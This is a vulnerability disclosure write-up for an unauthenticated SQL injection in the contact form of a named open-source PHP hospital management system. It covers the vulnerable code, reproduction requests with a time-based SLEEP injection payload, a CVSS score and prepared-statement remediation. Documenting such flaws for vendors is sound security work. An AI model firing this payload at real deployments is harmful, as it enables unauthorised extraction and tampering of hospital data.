# Hospital-Management-System Contact Form SQL Injection (vanilla PHP + MySQLi)

> ⚠️ **COVERED / 勿提交**: 提报前查重发现在先披露——**GitHub issue #49/#6 (contact form 已有 XSS/注入报告 — 同表单)**。本目录仅作研究存档,不提交 VulDB。
**CWE-89 · Unauthenticated SQL injection (INSERT) · blind time-based extraction + arbitrary row injection**

> **Vendor:** kishan0725
> **Product:** Hospital-Management-System (vanilla PHP + MySQLi)
> **Affected version:** master branch, commit 777fda46b77a820977a5ba616283dbfbc40bf7e1 (last commit 2024-10-07; no official release version)
> **Affected endpoints:** POST /contact.php (`btnSubmit=1`, fields `txtName`, `txtEmail`, `txtPhone`, `txtMsg`)
> **Dedup status:** CLEAN — reviewed against the 12 CVEs already assigned to this project; none covers `contact.php`, an INSERT-context sink, or this root cause.
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The public contact form of Hospital-Management-System concatenates four unfiltered `$_POST` fields into an `INSERT` statement. By closing the quoted value and rewriting the `VALUES` tuple from the `txtPhone` field, an unauthenticated attacker injects SQL expressions into the INSERT — verified with a `SLEEP()` time oracle (5.04 s vs 0.03 s baseline) plus stored-row proof that the database evaluated the injected expression.

## 2. Root Cause

| File | Lines | Statement |
|---|---|---|
| `contact.php` | 5-11 (sink at 10) | contact INSERT (below) |

```php
// contact.php:5-11 (entry: POST btnSubmit=1)
$name    = $_POST['txtName'];
$email   = $_POST['txtEmail'];
$contact = $_POST['txtPhone'];
$message = $_POST['txtMsg'];
$query = "insert into contact(name,email,contact,message)
          values('$name','$email','$contact','$message');";
mysqli_query($con, $query);
```

Raw string concatenation of all four POST fields, no escaping, no prepared statement; the handler is on the public contact page with no authentication.

## 3. Prerequisites

None. The contact form is public; no session, token or rate limit is involved.

## 4. Reproduction

Baseline:

```http
POST /contact.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

btnSubmit=1&txtName=Night&txtEmail=night@test.local&txtPhone=1234567890&txtMsg=hello
# -> HTTP 200 in 0.031 s; row stored as submitted
```

Injection (time oracle via VALUES rewrite):

```http
POST /contact.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

btnSubmit=1&txtName=Night&txtEmail=night@test.local&txtPhone=x%27%2C%28SELECT%20SLEEP%285%29%29%29--%20-&txtMsg=hello
# decodes to: txtPhone = x',(SELECT SLEEP(5)))-- -
# -> HTTP 200 in 5.044 s
```

The payload rewrites `values('$name','$email','x',(SELECT SLEEP(5)))-- -'` — exactly four columns, 4th column becomes the expression, tail commented out.

Stored-row proof (expression evaluated by MySQL):

```sql
SELECT * FROM contact WHERE email='night@test.local';
-- Night | night@test.local | 1234567890 | hello   (baseline)
-- Night | night@test.local | x          | 0       (payload: contact='x', message=SLEEP(5) return value 0)
```

Runnable PoC: `poc/poc.sh`.

## 5. Confirmed Techniques

- Manual verification on a local instance: MySQL 8.0.39 (127.0.0.1:3307), PHP 8.4.26 built-in server, `display_errors=0`, seeded `myhmsdb.sql`.
- Time oracle: 5.044 s vs 0.031 s baseline, reproducible with `SLEEP(n)` for varying n.
- Stored-value proof: injected row stores the evaluated expression result (`message='0'`), ruling out client-side or error-message artifacts.

## 6. Impact

Blind INSERT-context SQL injection on a public endpoint: time-based extraction of database content (one bit per request), injection of arbitrary/malformed rows into the `contact` table, and stored-value manipulation (e.g. planting misleading contact records). If any page renders the contact table, a second-order read-back channel becomes available.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` (Base 6.5, Medium)

## 8. Remediation

- Use a prepared statement with bound parameters for all four fields.
- Optionally validate `txtPhone` server-side as a phone-number pattern (defense in depth).

## 9. References

- Project: https://github.com/kishan0725/Hospital-Management-System
- Commit: 777fda46b77a820977a5ba616283dbfbc40bf7e1 (master, 2024-10-07)
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- External disclosure: https://gist.github.com/qianqiusujiu/1f50d38f51bcd2110c21b258d067bf61
- VulDB submission #xxxxxx
- Local verification record: `evidence/HMS-06.txt`; PoC: `poc/poc.sh`

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
